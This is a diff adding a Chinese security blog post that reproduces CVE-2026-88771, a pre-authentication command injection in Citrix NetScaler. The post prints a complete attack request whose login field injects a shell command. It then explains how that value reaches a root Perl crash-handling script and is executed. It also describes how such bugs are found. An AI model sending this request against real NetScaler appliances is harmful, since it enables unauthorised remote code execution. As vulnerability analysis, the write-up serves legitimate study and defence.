@@ -141,9 +141,17 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">日志</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
       </div>
   </nav>
 </div>
@@ -159,6 +167,192 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/10/14/cve-2026-88771/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/image.png">
+      <meta itemprop="name" content="Kwan1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kwan1's Blog">
+      <meta itemprop="description" content="无论云泥意贯一">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Kwan1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/10/14/cve-2026-88771/" class="post-title-link" itemprop="url">CVE-2026-88771 复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-10-14 12:26:12 / 修改时间：15:14:08" itemprop="dateCreated datePublished" datetime="2026-10-14T12:26:12+08:00">2026-10-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <!-- 图片放到同名文件夹 cve-2026-88771/ 下，直接用文件名引用，例如: ![架构图](arch.png) -->
+
+
+<h2 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h2><ul>
+<li><strong>CVE 编号</strong>：CVE-2026-88771</li>
+<li><strong>漏洞类型</strong>：命令注入。由于输入校验不当，允许未认证攻击者执行任意命令，默认配置即可触发</li>
+<li><strong>漏洞位点</strong>：<code>ns_monuploadd_err.pl</code>，一个 Perl 运维脚本，而非 <code>nsppe</code> 二进制</li>
+</ul>
+<h2 id="0x02-触发方式"><a href="#0x02-触发方式" class="headerlink" title="0x02 触发方式"></a>0x02 触发方式</h2><p>向 <code>/nf/auth/doAuthentication.do</code> 发一个未认证的 POST 登录请求，<code>login</code> 字段携带伪造的 pitboss 崩溃记录（URL 全编码）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /nf/auth/doAuthentication.do HTTP/1.1</span><br><span class="line">Host: netscaler-aaa-server</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">login=&lt;@urlencode_all&gt;pitboss PPE unexpectedly died NSPPE;`id&gt;/var/tmp/watchTowr`;# X&lt;@/urlencode_all&gt;&amp;passwd=x&amp;savecredentials=false&amp;nsg-x1-logon-button=LogOn</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;@urlencode_all&gt;...&lt;@/urlencode_all&gt;</code> 是 Burp Intruder 的 payload 处理标记，发送时 login 值会被整体 URL 编码。</p>
+<p>登录流程会把用户输入完整保存到日志中，<code>ns_monuploadd_err.pl</code> 文件会定期读取日志并提取特定格式的字符串，并拼接进 <code>find</code> 命令执行，导致攻击者注入的恶意命令被执行。</p>
+<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><h3 id="PPE-与漏洞位点"><a href="#PPE-与漏洞位点" class="headerlink" title="PPE 与漏洞位点"></a>PPE 与漏洞位点</h3><p>PPE（即设备上的 <code>nsppe</code> 二进制）处理所有流经设备的流量包，每颗 CPU 核心会负责一个 PPE 实例。由于 PPE 直接解析互联网进来的每一个字节，因此历史中绝大多数未认证漏洞都出自它。</p>
+<p>然而，CVE-2026-88771 不在这个二进制里，而出现在 NetScaler 对 PPE 进行崩溃后处理的辅助脚本层（<code>ns_monuploadd_err.pl</code>）中。</p>
+<h3 id="nsppe-的崩溃处理机制"><a href="#nsppe-的崩溃处理机制" class="headerlink" title="nsppe 的崩溃处理机制"></a>nsppe 的崩溃处理机制</h3><ul>
+<li><strong>pitboss 进程</strong>：统一拉起并监控每个 CPU 核心的 PPE，PPE 需定时上报存活信号；</li>
+<li><strong>PPE 死亡</strong>（段错误 &#x2F; abort）：进程消失，内核自动把进程内存镜像转储成 core 文件落在 <code>/var/core/</code>，命名 <code>NSPPE-&lt;编号&gt;-&lt;PID&gt;</code>（如 <code>NSPPE-00-12345</code>）；</li>
+<li><strong>PPE 卡住</strong>：pitboss 主动杀掉重拉。</li>
+</ul>
+<p>随后 pitboss 往共享日志（<code>/var/log/ns.log</code>）写一行死亡通知，然后重启 PPE，流量恢复：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pitboss: NSPPE-00 (12345) unexpectedly died</span><br></pre></td></tr></table></figure>
+
+<h3 id="ns-monuploadd-err-pl"><a href="#ns-monuploadd-err-pl" class="headerlink" title="ns_monuploadd_err.pl"></a>ns_monuploadd_err.pl</h3><p>PPE 崩溃后收集 core 文件、上传错误报告的监控脚本（周期运行，最长 24h）：从日志中提取准确的内核转储文件名，并执行 find 指令，读取文件的详细路径以供后续处理。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> <span class="variable">$WR_PPE_COREFILE_NAME</span> = <span class="string">`grep -E -i &quot;pitboss.*PPE.*missed too many heartbeats|pitboss.*PPE.*unexpectedly died&quot; @NR_FILES | tail -1 |</span></span><br><span class="line"><span class="string">    sed -e &#x27;s!.*NSPPE!NSPPE!g&#x27; -e &#x27;s!(!!g&#x27; -e &#x27;s!)!!g&#x27; |</span></span><br><span class="line"><span class="string">    awk &#x27;&#123; print $1&quot;-&quot;$2 &#125;&#x27;;`</span></span><br></pre></td></tr></table></figure>
+
+<p>提取链路：</p>
+<ul>
+<li><strong>grep</strong>：从日志中（<code>/var/log/ns.log</code>）提取 <code>pitboss.*PPE.*missed too many heartbeats</code> 与 <code>pitboss.*PPE.*unexpectedly died</code> 两种格式的行；</li>
+<li><strong>tail -1</strong>：保留最后一条（即最后一次崩溃）；</li>
+<li><strong>sed</strong>：删除 NSPPE 之前的前缀和整个字段中的括号；</li>
+<li><strong>awk</strong>：取前两个以空白相隔的字段并用 <code>-</code> 连接，与内核 core 命名规则 <code>NSPPE-&lt;编号&gt;-&lt;PID&gt;</code> 精确对应。</li>
+</ul>
+<p>以这条日志为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pitboss: NSPPE-00 (12345) unexpectedly died</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>grep 与 tail -1 将这条日志提取并保留；</li>
+<li>sed 删除 NSPPE 之前的前缀和整个字段中的括号，得到 <code>NSPPE-00 12345 unexpectedly died</code>；</li>
+<li>awk 取前两个字段并用 <code>-</code> 连接，得到 <code>NSPPE-00-12345</code>。</li>
+</ul>
+<h3 id="find-模板"><a href="#find-模板" class="headerlink" title="find 模板"></a>find 模板</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> <span class="variable">$WR_PPE_CORE</span> = <span class="string">`find $OFF_DIR/var/core -name $&#123;WR_PPE_COREFILE_NAME&#125;* -print | tail -1`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上一步的产出不做任何校验，直接插值。这段代码把 <code>${WR_PPE_COREFILE_NAME}</code> 替换成变量里的值、<code>$OFF_DIR</code> 替换成目录前缀。假设变量值是 <code>NSPPE-00-12345</code>，填完后这段文字变成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/core -name NSPPE-00-12345* -<span class="built_in">print</span> | <span class="built_in">tail</span> -1</span><br></pre></td></tr></table></figure>
+
+<p>在 Perl 语言规范中，反引号用于把命令交给 shell 执行并捕获输出，因此这里的执行效果就是读取以 <code>NSPPE-00-12345</code> 开头的文件并将输出返回给 Perl 脚本，随后将文件找到并打包，作为给 Citrix 的崩溃诊断证据。</p>
+<h3 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h3><p>作为一个日志处理程序，其默认日志内容是系统生成的且安全的（听起来似乎没什么问题？）</p>
+<p>然而：为用于日志审计，<code>/var/log/ns.log</code> 会原样保存用户在认证过程的输入（即使认证失败）。攻击者可控日志的部分写入内容，因此这份共享日志可以同时出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pitboss: NSPPE-00 (12345) unexpectedly died</span><br><span class="line">AAAD API: sending login req to aaad for &lt;任意字符串&gt;...</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>如果这个任意字符串是 core 崩溃后日志的格式呢？导致以下日志被写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;local0.info&gt; xxxxxx 0-PPE-0 : default SSLVPN Message 675 0 : &quot;AAAD API: sending login req to aaad for &lt;pitboss PPE unexpectedly died NSPPE;:`id&gt;/var/tmp/watchTowr`;# X&gt;, factor &lt;xxxxx&gt;, auth type 4129, trans id 1350&quot;</span><br><span class="line">&lt;local1.info&gt; xxxxxx nsaaad[15791]: (0-57) process_kernel_socket: call to authenticate user :pitboss PPE unexpectedly died NSPPE;:`id&gt;/var/tmp/watchTowr`;# X, vsid :11813, userlen 70</span><br><span class="line">&lt;local0.info&gt; xxxxxx 0-PPE-0 : default AAATM Message 678 0 : &quot;AAAD RESP: received resp, user: &lt;pitboss PPE unexpectedly died NSPPE;:`id&gt;/var/tmp/watchTowr`;# X&gt;, factor: &lt;xxxxx&gt;, trans id 1350, pcb trans id 1350, q_flags 1879080964 aaad-resp 15 aaad-flags 0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>伪造的日志经过同一条管道处理（三行均能被 grep 匹配，<code>tail -1</code> 保留最后一条）：</p>
+<ul>
+<li>grep：匹配 <code>pitboss.*PPE.*unexpectedly died</code> 行；</li>
+<li>sed：删除 NSPPE 之前的前缀和整个字段中的括号，得到：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSPPE;:`id&gt;/var/tmp/watchTowr`;# X&gt;, factor: &lt;xxxxx&gt;, trans id 1350, pcb trans id 1350, q_flags 1879080964 aaad-resp 15 aaad-flags 0&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>awk：取前两个以空白相隔的字段并用 <code>-</code> 连接，得到：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSPPE;:`id&gt;/var/tmp/watchTowr`;#-X&gt;,</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>这里就会执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/core -name NSPPE;:`<span class="built_in">id</span>&gt;/var/tmp/watchTowr`;#-X&gt;,* -<span class="built_in">print</span> | <span class="built_in">tail</span> -1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>find /var/core -name NSPPE</code>：寻找名为 NSPPE 的文件；</li>
+<li><code>:`id&gt;/var/tmp/watchTowr`</code>：执行 payload；</li>
+<li><code>#-X&gt;,* -print | tail -1</code>：被 <code>#</code> 注释掉。</li>
+</ul>
+<h2 id="0x04-攻击者最初可能是怎么挖到的？"><a href="#0x04-攻击者最初可能是怎么挖到的？" class="headerlink" title="0x04 攻击者最初可能是怎么挖到的？"></a>0x04 攻击者最初可能是怎么挖到的？</h2><p>推测：读文件，而不是打二进制。</p>
+<p>NetScaler 的应用主体分为三层：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>组成</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用主体</td>
+<td><code>nsppe</code>（二进制）</td>
+<td>处理数据 &#x2F; 认证面前台</td>
+</tr>
+<tr>
+<td>守护进程层</td>
+<td><code>nsaaad</code>（认证后台）、<code>pitboss</code>、<code>httpd</code>（管理面）等</td>
+<td>常驻、编译型</td>
+</tr>
+<tr>
+<td>辅助脚本层</td>
+<td><code>/netscaler</code> 下 Perl&#x2F;Shell 脚本，如 <code>ns_monuploadd_err.pl</code></td>
+<td>明文、root、cron 驱动</td>
+</tr>
+</tbody></table>
+<p>挖掘路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">审计脚本层（形状扫描：grep 反引号 / 两段式插值）</span><br><span class="line">    ↓</span><br><span class="line">发现命令注入汇点（ns_monuploadd_err.pl 的 grep|sed|awk → find 反引号）</span><br><span class="line">    ↓</span><br><span class="line">沿汇点输入反向溯源 → 锁定中间存储（grep 模式指向的日志文件）</span><br><span class="line">    ↓</span><br><span class="line">追溯该存储的写入者 → 未认证可达源点（AAAD 登录日志）</span><br><span class="line">    ↓</span><br><span class="line">验证触发（nsmonuploadd 周期 / 强制手段）</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-类似漏洞的挖掘思路"><a href="#0x05-类似漏洞的挖掘思路" class="headerlink" title="0x05 类似漏洞的挖掘思路"></a>0x05 类似漏洞的挖掘思路</h2><p>辅助脚本层审计：</p>
+<p><strong>特权消费者（root 脚本）+ 共享存储（日志&#x2F;文件）+ 未认证生产者（表单&#x2F;UA）&#x3D; 二阶注入流</strong></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/oh-look-the-foot-gun-went-off-again-citrix-netscaler-preauth-command-injection-cve-2026-88771">Oh Look, The Foot Gun Went Off Again (Citrix NetScaler PreAuth Command Injection CVE-2026-88771) — watchTowr Labs</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
